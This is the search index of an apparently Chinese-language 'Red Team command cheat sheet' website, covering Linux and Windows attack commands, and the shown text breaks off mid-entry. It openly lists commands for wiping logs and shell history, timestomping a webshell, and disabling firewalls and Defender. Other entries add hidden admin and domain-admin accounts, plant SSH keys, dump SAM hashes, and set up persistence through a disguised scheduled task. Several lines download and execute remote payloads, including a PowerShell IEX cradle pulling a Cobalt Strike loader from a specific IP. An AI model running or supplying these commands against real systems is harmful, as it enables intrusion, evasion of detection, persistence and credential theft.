{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u4ecb\u7ecd \u7ea2\u961f\u547d\u4ee4\u901f\u67e5 \u662f\u7531\u68f1\u89d2\u793e\u533a (Edge Forum) \u6574\u7406\u7684\u5173\u4e8e Red Team \u671f\u95f4\u6240\u5e38\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u547d\u4ee4\u3002 '''+ Edge Team +''' __ _ __ ___ |_ _|(_| _ (_ _ _ __ o _|_ \\/ | _ _ __ |__(_|__|(/_ __)(/_(_ |_| | | |_ / | (/_(_|||| \u76ee\u5f55 Linux \u547d\u4ee4\u901f\u67e5 Windows \u547d\u4ee4\u901f\u67e5 Tools \u547d\u4ee4\u901f\u67e5 mimikatz cobaltstrike \u6570\u636e\u5e93\u547d\u4ee4\u901f\u67e5 mysql sql server oracle postgresql elasticsearch \u611f\u8c22 \u4ee5\u4e0b\u6392\u540d\u4e0d\u5206\u5148\u540e! @loid @r0exper @\u8def\u4eba\u7532","title":"\u4ecb\u7ecd"},{"location":"#_1","text":"\u7ea2\u961f\u547d\u4ee4\u901f\u67e5 \u662f\u7531\u68f1\u89d2\u793e\u533a (Edge Forum) \u6574\u7406\u7684\u5173\u4e8e Red Team \u671f\u95f4\u6240\u5e38\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u547d\u4ee4\u3002 '''+ Edge Team +''' __ _ __ ___ |_ _|(_| _ (_ _ _ __ o _|_ \\/ | _ _ __ |__(_|__|(/_ __)(/_(_ |_| | | |_ / | (/_(_||||","title":"\u4ecb\u7ecd"},{"location":"#_2","text":"Linux \u547d\u4ee4\u901f\u67e5 Windows \u547d\u4ee4\u901f\u67e5 Tools \u547d\u4ee4\u901f\u67e5 mimikatz cobaltstrike \u6570\u636e\u5e93\u547d\u4ee4\u901f\u67e5 mysql sql server oracle postgresql elasticsearch","title":"\u76ee\u5f55"},{"location":"#_3","text":"\u4ee5\u4e0b\u6392\u540d\u4e0d\u5206\u5148\u540e! @loid @r0exper @\u8def\u4eba\u7532","title":"\u611f\u8c22"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","text":"Linux \u547d\u4ee4\u901f\u67e5 \u672c\u6b21\u4e0d\u8bb0\u5f55\u547d\u4ee4 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 \u5e38\u7528\u65e5\u5fd7\u6e05\u7406 echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u4f7f\u7528last\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b /var/log/secure \u8bb0\u5f55\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7 Web \u65e5\u5fd7\u6e05\u7406 \u76f4\u63a5\u66ff\u6362\u65e5\u5fd7ip\u5730\u5740: sed -i 's/127.0.0.1/192.168.1.1/g' access.log \u6e05\u9664\u90e8\u5206\u76f8\u5173\u65e5\u5fd7: \u4f7f\u7528grep -v\u6765\u628a\u76f8\u5173\u4fe1\u606f\u5220\u9664: cat /var/log/nginx/access.log | grep -v evil.php > tmp.log \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6: cat tmp.log > /var/log/nginx/access.log \u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406 export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 \u67e5\u770b\u7528\u6237\u767b\u5f55\u8bb0\u5f55 last root \u6743\u9650\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237 sudo useradd -m testt && echo \"testt:admin@123\" | sudo chpasswd && sudo usermod -aG wheel testt cURL/wget \u4e0b\u8f7d\u6587\u4ef6 wget -P /tmp/ http://x.x.x.x:8080/shell curl -o /tmp/xxx http://x.x.x.x:8080/shell \u6587\u4ef6\u65f6\u95f4\u4fee\u6539 \u4fee\u6539 /www/wwwroot/shell.php \u65f6\u95f4\u4e3a 2024.05.16.24 touch -t 202405161200.24 /www/wwwroot/shell.php \u67e5\u770b DNS \u670d\u52a1\u5668 cat /etc/resolv.conf \u505c\u6b62\u9632\u706b\u5899 systemctl stop firewalld && service iptables stop && ufw disable \u641c\u7d22\u654f\u611f\u4fe1\u606f find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.yaml\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E \"=jdbc:|pass=|passwd=|aliyun|password\" echo \u5199\u6587\u4ef6 //\u76f4\u63a5 echo \u5199\u5165\uff1a echo xxx > /www/xxx.jsp //base64 \u5199\u5165\uff1a echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp //\u8ffd\u52a0 echo xxx >> /www/xxx.jsp \u5199\u5165 ssh \u516c\u94a5\uff1a echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys //\u4f7f\u7528 printf \u5728\u672b\u5c3e\u5904\u63d2\u5165\uff0c\u5982\u9700\u6362\u884c\u53ef\u6dfb\u52a0\\n //\u53c2\u8003https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc printf \"ssh-rsa xxx\" >> /root/.ssh/authorized_keys \u538b\u7f29\u6253\u5305\u6587\u4ef6 //\u5c06 /home/mail /home/web \u4e24\u4e2a\u76ee\u5f55\u6253\u5305\u81f3 /tmp \u76ee\u5f55\u4e0b\u547d\u540d\u4e3aweb.tar.gz tar czvf /tmp/web.tar.gz /home/mail /home/web //zip zip -r /tmp/web.zip /home/mail /home/web //\u53ef\u4f7f\u7528 -x \u6392\u9664\uff0c\u5982: zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/* \u5206\u5272\u4e0a\u4f20 split -n 3 fscan //\u5206\u5272\u4e3a 3 \u4e2a\u6587\u4ef6 split -b 500k fscan //\u4ee5 500 K \u5927\u5c0f\u5206\u5272 fscan Windows \u5408\u5e76\uff1a copy /b xaa+xab fscan type xaa xab > fscan Linux \u5408\u5e76\uff1a cat xaa xab > fscan","title":"Linux \u547d\u4ee4\u901f\u67e5"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#linux","text":"","title":"Linux \u547d\u4ee4\u901f\u67e5"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_1","text":"unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0","title":"\u672c\u6b21\u4e0d\u8bb0\u5f55\u547d\u4ee4"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_2","text":"echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u4f7f\u7528last\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b /var/log/secure \u8bb0\u5f55\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7","title":"\u5e38\u7528\u65e5\u5fd7\u6e05\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#web","text":"\u76f4\u63a5\u66ff\u6362\u65e5\u5fd7ip\u5730\u5740: sed -i 's/127.0.0.1/192.168.1.1/g' access.log \u6e05\u9664\u90e8\u5206\u76f8\u5173\u65e5\u5fd7: \u4f7f\u7528grep -v\u6765\u628a\u76f8\u5173\u4fe1\u606f\u5220\u9664: cat /var/log/nginx/access.log | grep -v evil.php > tmp.log \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6: cat tmp.log > /var/log/nginx/access.log","title":"Web \u65e5\u5fd7\u6e05\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_3","text":"export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890","title":"\u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_4","text":"last","title":"\u67e5\u770b\u7528\u6237\u767b\u5f55\u8bb0\u5f55"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#root","text":"sudo useradd -m testt && echo \"testt:admin@123\" | sudo chpasswd && sudo usermod -aG wheel testt","title":"root \u6743\u9650\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#curlwget","text":"wget -P /tmp/ http://x.x.x.x:8080/shell curl -o /tmp/xxx http://x.x.x.x:8080/shell","title":"cURL/wget \u4e0b\u8f7d\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_5","text":"\u4fee\u6539 /www/wwwroot/shell.php \u65f6\u95f4\u4e3a 2024.05.16.24 touch -t 202405161200.24 /www/wwwroot/shell.php","title":"\u6587\u4ef6\u65f6\u95f4\u4fee\u6539"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#dns","text":"cat /etc/resolv.conf","title":"\u67e5\u770b DNS \u670d\u52a1\u5668"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_6","text":"systemctl stop firewalld && service iptables stop && ufw disable","title":"\u505c\u6b62\u9632\u706b\u5899"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_7","text":"find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.yaml\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E \"=jdbc:|pass=|passwd=|aliyun|password\"","title":"\u641c\u7d22\u654f\u611f\u4fe1\u606f"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#echo","text":"//\u76f4\u63a5 echo \u5199\u5165\uff1a echo xxx > /www/xxx.jsp //base64 \u5199\u5165\uff1a echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp //\u8ffd\u52a0 echo xxx >> /www/xxx.jsp","title":"echo \u5199\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#ssh","text":"echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys //\u4f7f\u7528 printf \u5728\u672b\u5c3e\u5904\u63d2\u5165\uff0c\u5982\u9700\u6362\u884c\u53ef\u6dfb\u52a0\\n //\u53c2\u8003https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc printf \"ssh-rsa xxx\" >> /root/.ssh/authorized_keys","title":"\u5199\u5165 ssh \u516c\u94a5\uff1a"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_8","text":"//\u5c06 /home/mail /home/web \u4e24\u4e2a\u76ee\u5f55\u6253\u5305\u81f3 /tmp \u76ee\u5f55\u4e0b\u547d\u540d\u4e3aweb.tar.gz tar czvf /tmp/web.tar.gz /home/mail /home/web //zip zip -r /tmp/web.zip /home/mail /home/web //\u53ef\u4f7f\u7528 -x \u6392\u9664\uff0c\u5982: zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*","title":"\u538b\u7f29\u6253\u5305\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_9","text":"split -n 3 fscan //\u5206\u5272\u4e3a 3 \u4e2a\u6587\u4ef6 split -b 500k fscan //\u4ee5 500 K \u5927\u5c0f\u5206\u5272 fscan Windows \u5408\u5e76\uff1a copy /b xaa+xab fscan type xaa xab > fscan Linux \u5408\u5e76\uff1a cat xaa xab > fscan","title":"\u5206\u5272\u4e0a\u4f20"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","text":"Windows \u547d\u4ee4\u901f\u67e5 TCP \u51fa\u7f51\u63a2\u6d4b powershell Test-NetConnection -ComputerName [\u76ee\u6807\u4e3b\u673a\u540d\u6216IP] -Port [\u7aef\u53e3\u53f7] \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6 certutil certutil.exe -urlcache -split -f \"http://127.0.0.1:8080/file.exe\" \"C:/Windows/temp/file.exe\" //\u4ece http://127.0.0.1:8080/ \u4e0b\u8f7d file.exe \u5e76\u4fdd\u5b58\u5230 C:/Windows/temp/file.exe PowerShell powershell -Command \"Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\\Downloads\\file.zip'\" BitsAdmin bitsadmin /transfer \"JobName\" /download /priority normal https://www.example.com/file.zip C:\\path\\to\\save\\file.zip rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} IIS \u7f51\u7ad9\u67e5\u8be2 \u67e5\u770b IIS \u7ed1\u5b9a\u7684\u7f51\u7ad9\uff1a %windir%\\system32\\inetsrv\\appcmd.exe list sites \u67e5\u770b Site ID \u4e3a 1 \u7684\u7269\u7406\u8def\u5f84\uff1a %windir%\\system32\\inetsrv\\appcmd list site /site.id:1 /config | findstr \"physicalPath\" IIS \u914d\u7f6e\u6587\u4ef6\uff1a C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config %SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config \u4fee\u6539\u6587\u4ef6\u65f6\u95f4 powershell -command \"(Get-Item 'C:\\path\\to\\your\\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\\path\\to\\your\\file.txt').LastWriteTime = '2024-01-02 12:00 AM'\" \u8fdb\u7a0b\u64cd\u4f5c \u67e5\u770b\u7aef\u53e3\u5bf9\u5e94 PID\uff1a netstat -ano | findstr :80 \u67e5\u770b PID \u5bf9\u5e94\u7a0b\u5e8f\uff1a tasklist /FI \"PID eq 1234\" \u6839\u636e PID \u67e5\u770b\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\uff1a wmic process where ProcessId=1234 get ExecutablePath \u6267\u884c\u8fdb\u7a0b\uff1a start /b xxx.exe \u6839\u636e\u540d\u79f0\u7ed3\u675f\u8fdb\u7a0b\uff1a taskkill /f /t /im GotoHTTP.exe \u641c\u7d22\u8fdb\u7a0b tasklist | findstr \"powershell\" Powershell \u65e0\u7a97\u53e3\u6267\u884c EXE powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe' net \u547d\u4ee4 \u67e5\u770b\u7528\u6237\u5217\u8868: net user powershell\u67e5\u770b\u7528\u6237\u5217\u8868: Get-WmiObject -Class Win32_UserAccount \u67e5\u770b\u7528\u6237\u7ec4\u5217\u8868: net localgroup \u67e5\u770b\u7ba1\u7406\u7ec4\u5217\u8868: net localgroup Administrators \u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801: net user test P@ssw0rd /add \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup Administrators test /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u6fc0\u6d3bguest\u7528\u6237: net user guest /active:yes \u66f4\u6539guest\u7528\u6237\u7684\u5bc6\u7801: net user guest P@ssw0rd \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup administrators guest /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u67e5\u770b\u672c\u5730\u5bc6\u7801\u7b56\u7565: net accounts \u67e5\u770b\u5f53\u524d\u4f1a\u8bdd: net session \u5efa\u7acbIPC\u4f1a\u8bdd: net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\" netsh \u64cd\u4f5c\u9632\u706b\u5899 \u67e5\u770b\u9632\u706b\u5899\u914d\u7f6e\uff1a netsh firewall show config Windows Server 2003 \u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5141\u8bb8\u6307\u5b9a\u7a0b\u5e8f\u5168\u90e8\u8fde\u63a5 netsh firewall add allowedprogram C:\\nc.exe \"allow nc\" enable Windows Server 2003\u4e4b\u540e\u7684\u7248\u672c netsh advfirewall firewall add rule name=\"pass nc\" dir in action=allow program=\"C:\\nc.exe \u5141\u8bb83389\u653e\u884c netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow WIndows Defender \u52a0\u767d\u6392\u9664\u76ee\u5f55\uff1a C:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\Root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference call Add ExclusionPath=C:\\ powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath \"C:\\test\" \u6587\u4ef6\u5199\u5165 echo test > C:\\test.txt set /p=test<nul>C:\\test.txt //\u89c4\u907f\u7a7a\u683c echo.123>>a.txt echo,123>>a.txt type;a.txt //\u5c06base64\u7f16\u7801\u7684\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -f -decode base64.txt C:\\\\test.jsp //\u5c06\u5341\u516d\u8fdb\u5236\u6587\u4ef6\u89e3\u7801\u5199\u5165\u5230 test.jsp certutil -decodehex hex.txt C:\\\\test.jsp \u6ce8\u518c\u8868\uff1a Restricted Admin Mode \u5bf9\u5e94\u547d\u4ee4\u884c\u5f00\u542f Restricted Admin mode \u547d\u4ee4\u5982\u4e0b\uff1a REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f \u67e5\u770b\u662f\u5426\u5df2\u5f00\u542f DisableRestrictedAdmin REG_DWORD 0x0 \u5b58\u5728\u5c31\u662f\u5f00\u542f REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\" \u67e5\u770b3389\u7aef\u53e3 REG query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber \u5f00\u542f\u8fdc\u7a0b\u684c\u9762 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f \u6216\u8005 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 \u5bfc\u51fa SAM \u6570\u636e\u5e93 reg save HKLM\\SYSTEM sys.hiv reg save HKLM\\SAM sam.hiv \u590d\u5236\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u4f7f\u7528 https://github.com/3gstudent/NinjaCopy \u8fdb\u884c\u590d\u5236\u3002 lsadump::sam /sam:sam.hiv /system:system.hiv \u67e5\u770b\u76d8\u7b26\u5269\u4f59\u7a7a\u95f4 ## \u5927\u5c0f\u4e3a\u5b57\u8282\u78c1\u76d8 ::\u67e5\u770bC\u76d8 wmic LogicalDisk where \"Caption='C:'\" get FreeSpace,Size /value ::\u67e5\u770bD\u76d8 wmic LogicalDisk where \"Caption='D:'\" get FreeSpace,Size /value \u641c\u7d22\u6587\u4ef6\uff1a #\u641c\u7d22 D \u76d8\u4e0b\u540d\u4e3a shell.jsp \u7684\u6587\u4ef6 cd /d D:\\ && dir /b /s shell.jsp #\u641c\u7d20 D \u76d8\u4e0b\u540e\u7f00\u4e3a conf \u5185\u5bb9\u4e14\u5305\u542b password\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09: findstr /s /i /n /d:D:\\ \"password\" *.conf CS \u4e0a\u7ebf powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://122.114.55.117:8012/download/upload.ps1') msiexec /q /i http://127.0.0.1:8080/ms10-051.msi \u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027 attrib +s +a +h +r cs.exe // \u7ed9\u6587\u4ef6\u8bbe\u7f6e\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027 \u8ba1\u5212\u4efb\u52a1 schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\cs.exe\" // \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aMicrosoft\\Windows\\Multimedia\\SystemMediaService\uff0c\u5f00\u673a\u65f6\u6267\u884c c:\\cs.exe \u7684\u8ba1 \u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 schtasks /change /tn \"Microsoft\\Windows\\Multimedia\\SystemSoundsService\" /ru system /tr \"C:\\cs.exe\" /enable // \u4fee\u6539Microsoft\\Windows\\Multimedia\\SystemSoundsService \u8ba1\u5212\u4efb\u52a1\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c \u66f4\u6539\u4efb\u52a1\u65e0\u6cd5\u901a\u8fc7 /sc\u3001/mo \u53c2\u6570\u66f4\u6539\u8ba1\u5212\u9891\u7387 RDP \u51ed\u636e #\u5217\u51fa\u6240\u6709 RDP \u51ed\u8bc1 C:\\Users\\\u7528\u6237\u540d\\AppData\\Local\\Microsoft\\Credentials dir /a C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials Windows \u6253\u5305\u76ee\u5f55\u4e0a\u4f20\u6587\u4ef6 powershell -Command \"Compress-Archive -Path E:\\update\\ -DestinationPath E:\\test.zip\" 7z.exe a -r -p12345 C:\\webs\\1.7z C:\\webs\\ zip -r C:\\webs\\1.zip C:\\webs\\ \u57df\u6e17\u900f\u547d\u4ee4 whoami /user //\u67e5\u770b\u5f53\u524d\u7528\u6237\u6743\u9650 net config workstation //\u53ef\u77e5\u57df\u540d\u548c\u5176\u4ed6\u4fe1\u606f net user /domain //\u67e5\u8be2\u57df\u7528\u6237 net user edgeuser Admin12345 /add /domain //\u6dfb\u52a0\u57df\u7528\u6237 net group \"domain admins\" edgeuser /add /domain //\u6dfb\u52a0\u57df\u7ba1\u7406\u5458 net group \"enterprise admins\" edgeuser /add /domain //\u6dfb\u52a0\u4f01\u4e1a\u7ba1\u7406\u5458 net group \"domain admins\" /domain //\u67e5\u8be2\u57df\u7ba1\u7406\u5458\u7528\u6237 net group \"enterprise admins\" /domain //\u67e5\u8be2\u57df\u4f01\u4e1a\u7ba1\u7406\u7ec4 net localgroup administrators /domain //\u67e5\u8be2\u57df\u672c\u5730\u7ba1\u7406\u7ec4 net time /domain //\u67e5\u8be2\u57df\u63a7\u5236\u5668\u548c\u65f6\u95f4 net view /domain //\u67e5\u8be2\u57df\u540d\u79f0 net view /domain:redteam.local //\u67e5\u8be2\u57df\u5185\u8ba1\u7b97\u673a net group \"domain computers\" /domain //\u67e5\u770b\u5f53\u524d\u57df\u5185\u8ba1\u7b97\u673a\u5217\u8868 net group \"domain controllers\" /domain //\u67e5\u770b\u57df\u63a7\u673a\u5668\u540d net accounts /domain //\u67e5\u770b\u57df\u5bc6\u7801\u7b56\u7565 nltest /domain_trusts //\u67e5\u770b\u57df\u4fe1\u4efb nltest /domain_trusts /all_trusts /v /server:10.10.10.10 //\u67e5\u770b\u67d0\u4e2a\u57df\u7684\u57df\u4fe1\u4efb nslookup -type=SRV _ldap._tcp.corp //\u901a\u8fc7srv\u8bb0\u5f55\u67e5\u627e\u57df\u63a7\u5236\u5668","title":"Windows \u547d\u4ee4\u901f\u67e5"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#windows","text":"","title":"Windows \u547d\u4ee4\u901f\u67e5"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#tcp","text":"powershell Test-NetConnection -ComputerName [\u76ee\u6807\u4e3b\u673a\u540d\u6216IP] -Port [\u7aef\u53e3\u53f7]","title":"TCP \u51fa\u7f51\u63a2\u6d4b"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_1","text":"","title":"\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#certutil","text":"certutil.exe -urlcache -split -f \"http://127.0.0.1:8080/file.exe\" \"C:/Windows/temp/file.exe\" //\u4ece http://127.0.0.1:8080/ \u4e0b\u8f7d file.exe \u5e76\u4fdd\u5b58\u5230 C:/Windows/temp/file.exe","title":"certutil"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#powershell","text":"powershell -Command \"Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\\Downloads\\file.zip'\"","title":"PowerShell"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#bitsadmin","text":"bitsadmin /transfer \"JobName\" /download /priority normal https://www.example.com/file.zip C:\\path\\to\\save\\file.zip","title":"BitsAdmin"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#rundll32","text":"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}","title":"rundll32"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#iis","text":"\u67e5\u770b IIS \u7ed1\u5b9a\u7684\u7f51\u7ad9\uff1a %windir%\\system32\\inetsrv\\appcmd.exe list sites \u67e5\u770b Site ID \u4e3a 1 \u7684\u7269\u7406\u8def\u5f84\uff1a %windir%\\system32\\inetsrv\\appcmd list site /site.id:1 /config | findstr \"physicalPath\" IIS \u914d\u7f6e\u6587\u4ef6\uff1a C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config %SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config","title":"IIS \u7f51\u7ad9\u67e5\u8be2"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_2","text":"powershell -command \"(Get-Item 'C:\\path\\to\\your\\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\\path\\to\\your\\file.txt').LastWriteTime = '2024-01-02 12:00 